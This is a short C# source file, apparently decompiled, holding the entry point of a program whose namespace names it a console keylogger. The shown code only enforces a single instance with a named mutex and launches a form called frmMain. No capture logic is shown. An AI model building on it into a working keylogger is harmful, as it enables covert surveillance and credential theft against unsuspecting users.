using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Console_Keylogger;

[Guid("89587956-452a-4ef9-af7b-32af8e5fdb81")]
internal class Program
{
	[STAThread]
	private static void Main()
	{
		int num = 0;
		while (num < 2)
		{
			bool createdNew;
			using (new Mutex(initiallyOwned: true, "89587956-452a-4ef9-af7b-32af8e5fdb81", out createdNew))
			{
				if (createdNew)
				{
					Application.EnableVisualStyles();
					Application.SetCompatibleTextRenderingDefault(false);
					Application.Run((Form)(object)new frmMain());
					break;
				}
				num++;
				Thread.Sleep(100);
			}
		}
	}
}
